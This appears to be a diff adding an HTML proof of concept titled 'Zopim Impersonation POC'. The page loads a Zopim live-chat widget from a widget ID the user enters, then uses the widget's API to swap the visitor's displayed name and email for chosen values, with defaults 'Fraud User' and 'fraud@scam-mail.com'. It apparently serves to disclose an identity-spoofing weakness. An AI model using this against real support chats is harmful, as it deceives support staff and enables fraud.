@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Zopim Impersonation POC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bigfishtv-turret/3.3.1/turret.min.css">
+</head>
+<body>
+
+<div class="container">
+    <div class="row">
+        <div class="column-1-2 column-center">
+            <div class="row">
+                <label for="widget-id">Widget ID (random character string in your widget code)</label>
+                <input type="text" id="widget-id" value="">
+            </div>
+            <div class="row">
+                <button class="button button-primary" id="create-widget">Initialize widget with default user</button>
+            </div>
+            <div class="row" style="height: 40px"></div>
+            <div class="row">
+                <label for="widget-name">Impersonation name</label>
+                <input type="text" id="widget-name" value="Fraud User">
+            </div>
+            <div class="row">
+                <label for="widget-email">Impersonation email</label>
+                <input type="email" id="widget-email" value="fraud@scam-mail.com">
+            </div>
+            <div class="row">
+                <button class="button button-primary" id="impersonate">Impersonate details</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    var idField = document.getElementById('widget-id');
+    var nameField = document.getElementById('widget-name');
+    var emailField = document.getElementById('widget-email');
+
+    var initZopim = function (d, s, id) {
+        var z = $zopim = function (c) {
+            z._.push(c)
+        }, $ = z.s =
+                d.createElement(s), e = d.getElementsByTagName(s)[0];
+        z.set = function (o) {
+            z.set._.push(o)
+        };
+        z._ = [];
+        z.set._ = [];
+        $.async = !0;
+        $.setAttribute('charset', 'utf-8');
+        $.src = '//v2.zopim.com/?' + id;
+        z.t = +new Date;
+        $.type = 'text/javascript';
+        e.parentNode.insertBefore($, e)
+    };
+
+    document.getElementById('create-widget').onclick = function () {
+        initZopim(document, 'script', idField.value);
+
+        $zopim(function () {
+            $zopim.livechat.setName('Default user');
+            $zopim.livechat.setEmail('default@mail.com');
+        });
+
+        this.disabled = true;
+        idField.disabled = true;
+    };
+
+    document.getElementById('impersonate').onclick = function () {
+        $zopim(function () {
+            $zopim.livechat.setName(nameField.value);
+            $zopim.livechat.setEmail(emailField.value);
+        });
+    };
+</script>
+</body>
+</html>
